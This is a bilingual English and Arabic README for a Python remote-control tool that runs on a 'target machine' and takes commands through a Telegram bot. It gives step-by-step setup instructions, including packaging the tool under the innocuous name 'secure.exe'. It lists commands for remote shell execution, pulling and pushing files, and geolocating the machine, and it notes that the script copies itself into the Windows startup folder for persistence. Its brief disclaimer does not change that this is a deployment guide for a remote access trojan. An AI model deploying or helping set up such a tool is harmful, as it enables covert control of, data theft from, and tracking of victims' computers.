# Telegram Bot Script

This script allows you to create a Telegram bot that can receive commands and perform various actions on the target machine. The bot can execute shell commands, receive and upload files, provide the location of the target machine, and more.

## Prerequisites

Before running the script, you need to have the following:

- Python 3 installed on the target machine: Make sure you have Python 3 installed on the machine where you want to run the script. You can download and install Python from the official Python website.

- Telegram bot token: You need to obtain a Telegram bot token to authenticate and communicate with the Telegram API. You can obtain a token by creating a bot using the BotFather on Telegram. Follow the instructions provided by BotFather to create a new bot and obtain the token.

- Chat ID: You need to specify the chat ID where you want to receive the bot's messages. This can be your personal chat or a group chat. To obtain the chat ID, start a chat with the bot and get the chat ID from the Telegram API. You can use tools like `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` to retrieve the chat ID.

## Installation

1. Clone or download the script to the target machine: Clone or download the script files from the repository and place them on the machine where you want to run the bot.

2. Install the required Python packages: Open a terminal or command prompt and navigate to the directory where you placed the script files. Run the following command to install the required Python packages:

   This will install the `telebot` and `requests` packages required for the script to work.

3. Replace the placeholders in the script: Open the script file in a text editor and replace the placeholders `YOUR_TELEGRAM_TOKEN` and `YOUR_CHAT_ID` with your actual Telegram bot token and chat ID.

4. Save the script as `secure.exe`: If you want to convert the script to an executable using PyInstaller, save the script file as `secure.py` and then use PyInstaller to convert it to an executable named `secure.exe`. This ensures that the script can be executed without the need for Python on the target machine.

Note: If you don't want to convert it to an executable, you can simply save the script with a different name, such as `agent.py`.

## Usage

1. Run the script: Open a terminal or command prompt and navigate to the directory where you placed the script files. Run the following command to start the bot:

```
python secure.py
````

or

````
secure.exe
```

The bot will start running and connect to the Telegram API.

2. Greeting message: Once the bot is running, it will send a greeting message to the specified chat ID to indicate that it has started successfully.

3. Sending commands: You can now send commands to the bot in the chat where you specified the chat ID. The bot will execute the corresponding actions on the target machine and send back the results.

4. Available commands: The bot supports the following commands:

- `/help`: Show available commands and their descriptions.
- `/exit`: Shut down the server and stop the bot.
- `/download <file_path>`: Send a file from the target machine to the bot.
- `/upload`: Receive a file from the bot and upload it to the target machine.
- `/shell <command>`: Execute a shell command on the target machine.
- `/shelloff`: Stop executing shell commands on the target machine.
- `/location`: Get the location of the target machine using an IP Geolocation API.
- `/destroy`: Remove the bot from the target machine.

You can use the `/help` command to see the full list of commands and their descriptions.

## Important Note

- Startup folder: This script includes functionality to copy itself to the Windows startup folder. This allows the script to be automatically executed when the target machine starts up. If you're running the script on a different operating system or want to change the startup folder location, make sure to review and modify the `startup` path in the script accordingly.

## Disclaimer

Use this script responsibly and with proper authorization. The actions performed by the bot may have security and privacy implications. The script is provided as-is, and the author accepts no responsibility for any misuse or damage caused by the script.

# سكريبت بوت التليجرام

يتيح لك هذا البرنامج النصي إنشاء روبوت Telegram يمكنه تلقي الأوامر وتنفيذ إجراءات مختلفة على الجهاز المستهدف. يمكن للروبوت تنفيذ أوامر الصدفة، واستقبال الملفات وتحميلها، وتوفير موقع الجهاز المستهدف، والمزيد.

# المتطلبات الأساسية

قبل تشغيل البرنامج النصي، يجب أن يكون لديك ما يلي:

- تثبيت Python 3 على الجهاز المستهدف: تأكد من تثبيت Python 3 على الجهاز الذي تريد تشغيل البرنامج النصي عليه. يمكنك تنزيل وتثبيت Python من موقع Python الرسمي.

- رمز Telegram bot: تحتاج إلى الحصول على رمز Telegram bot للمصادقة والتواصل مع Telegram API. يمكنك الحصول على رمز مميز عن طريق إنشاء روبوت باستخدام BotFather على Telegram. اتبع التعليمات المقدمة من BotFather لإنشاء روبوت جديد والحصول على الرمز المميز.

- معرف الدردشة: تحتاج إلى تحديد معرف الدردشة حيث تريد تلقي رسائل الروبوت. يمكن أن تكون هذه الدردشة الشخصية أو الدردشة الجماعية. للحصول على معرف الدردشة، ابدأ محادثة مع الروبوت واحصل على معرف الدردشة من Telegram API. يمكنك استخدام أدوات مثل `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates` لاسترداد معرف الدردشة.

# تثبيت

1. استنساخ البرنامج النصي أو تنزيله على الجهاز المستهدف: قم باستنساخ ملفات البرنامج النصي أو تنزيلها من المستودع ووضعها على الجهاز الذي تريد تشغيل الروبوت فيه.

2. قم بتثبيت حزم Python المطلوبة: افتح الوحدة الطرفية أو موجه الأوامر وانتقل إلى الدليل الذي وضعت فيه ملفات البرنامج النصي. قم بتشغيل الأمر التالي لتثبيت حزم Python المطلوبة:

    سيؤدي هذا إلى تثبيت حزمتي "telebot" و"الطلبات" المطلوبة لكي يعمل البرنامج النصي.

3. استبدل العناصر النائبة في البرنامج النصي: افتح ملف البرنامج النصي في محرر نصوص واستبدل العناصر النائبة `YOUR_TELEGRAM_TOKEN` و`YOUR_CHAT_ID` بالرمز المميز لبوت Telegram ومعرف الدردشة الفعليين.

4. احفظ البرنامج النصي باسم `secure.exe`: إذا كنت تريد تحويل البرنامج النصي إلى ملف قابل للتنفيذ باستخدام PyInstaller، فاحفظ ملف البرنامج النصي باسم `secure.py` ثم استخدم PyInstaller لتحويله إلى ملف قابل للتنفيذ باسم `secure.exe `. وهذا يضمن إمكانية تنفيذ البرنامج النصي دون الحاجة إلى لغة Python على الجهاز المستهدف.

ملاحظة: إذا كنت لا تريد تحويله إلى ملف قابل للتنفيذ، فيمكنك ببساطة حفظ البرنامج النصي باسم مختلف، مثل "agent.py".

# الاستخدام

1. قم بتشغيل البرنامج النصي: افتح المحطة الطرفية أو موجه الأوامر وانتقل إلى الدليل الذي وضعت فيه ملفات البرنامج النصي. قم بتشغيل الأمر التالي لبدء تشغيل الروبوت:

```
بيثون Secure.py
````

أو

````
Secure.exe
```

سيبدأ الروبوت في التشغيل والاتصال بواجهة برمجة تطبيقات Telegram.

2. رسالة ترحيب: بمجرد تشغيل الروبوت، سيرسل رسالة ترحيب إلى معرف الدردشة المحدد للإشارة إلى أنه قد بدأ بنجاح.

3. إرسال الأوامر: يمكنك الآن إرسال الأوامر إلى الروبوت في الدردشة حيث قمت بتحديد معرف الدردشة. سيقوم الروبوت بتنفيذ الإجراءات المقابلة على الجهاز المستهدف وإرسال النتائج مرة أخرى.

4. الأوامر المتوفرة: يدعم البوت الأوامر التالية:

- `/ مساعدة`: إظهار الأوامر المتاحة وأوصافها.
- `/exit`: قم بإيقاف تشغيل الخادم وإيقاف الروبوت.
- `/ تنزيل <file_path>`: أرسل ملفًا من الجهاز المستهدف إلى الروبوت.
- `/upload`: استلام ملف من الروبوت وتحميله على الجهاز المستهدف.
- `/shell <command>`: تنفيذ أمر shell على الجهاز المستهدف.
- `/shelloff`: إيقاف تنفيذ أوامر shell على الجهاز المستهدف.
- `/location`: احصل على موقع الجهاز المستهدف باستخدام IP Geolocation API.
- `/destroy`: قم بإزالة الروبوت من الجهاز المستهدف.

يمكنك استخدام الأمر `/help` لرؤية القائمة الكاملة للأوامر وأوصافها.

# ملاحظة مهمة

- مجلد بدء التشغيل: يتضمن هذا البرنامج النصي وظيفة لنسخ نفسه إلى مجلد بدء تشغيل Windows. يسمح هذا بتنفيذ البرنامج النصي تلقائيًا عند بدء تشغيل الجهاز المستهدف. إذا كنت تقوم بتشغيل البرنامج النصي على نظام تشغيل مختلف أو تريد تغيير موقع مجلد بدء التشغيل، فتأكد من مراجعة وتعديل مسار "بدء التشغيل" في البرنامج النصي وفقًا لذلك.

# تنصل

استخدم هذا البرنامج النصي بمسؤولية وبإذن مناسب. قد يكون للإجراءات التي يقوم بها الروبوت آثار تتعلق بالأمان والخصوصية. يتم توفير البرنامج النصي كما هو، ولا يتحمل المؤلف أي مسؤولية عن أي سوء استخدام أو ضرر ناتج عن البرنامج النصي.
Contacting ME :shellcloud18@gmail.com
Facebook :https://www.facebook.com/kimotcha233


